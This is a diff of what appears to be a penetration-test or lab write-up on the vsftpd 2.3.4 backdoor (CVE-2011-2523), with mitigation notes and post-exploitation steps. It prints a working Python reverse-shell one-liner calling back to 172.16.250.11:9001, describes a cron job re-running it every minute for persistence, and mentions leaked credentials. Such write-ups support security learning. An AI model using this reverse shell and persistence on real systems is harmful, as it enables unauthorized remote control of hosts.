@@ -237,7 +237,9 @@ For CVE-2011-2523, the mitigation involves the following steps:
 
 ```python
 Upgrade: Immediately upgrade to a non-vulnerable version of vsftpd beyond 2.3.4.
+```
 
+```python
 Patch Verification: Validate that the updated version does not contain the backdoor.
 ```
 
@@ -251,19 +253,20 @@ We can see that the root user has ALL-ALL permits
 After receiving a shell from the previously executed exploit, we upgraded to a bash shell
 
 First we are going to create a Crontab task that executes a reverse Shell every 1 minute
+
 ![[Pasted image 20250512163457.png]]
 
 We use this reverse Shell written in Python
+
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.250.11",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
 ```
 
 And finally we will be listening to the port we have selected. In this case the port 9001. We can see that we belong to another network interface 
+
 ![[Pasted image 20250512162449.png]]
 
 # Credential leak
-
-#Nota: Some of these credentials were tested in the webmin service in port 1000 and we got access
 
 ![[Pasted image 20250512164302.png]]
 
